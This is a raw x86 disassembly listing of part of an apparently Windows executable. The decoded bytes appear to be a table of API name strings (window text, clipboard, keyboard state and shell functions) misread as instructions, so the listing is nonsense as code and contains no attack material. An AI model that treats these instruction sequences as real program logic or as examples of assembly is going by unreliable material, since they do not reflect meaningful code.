  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
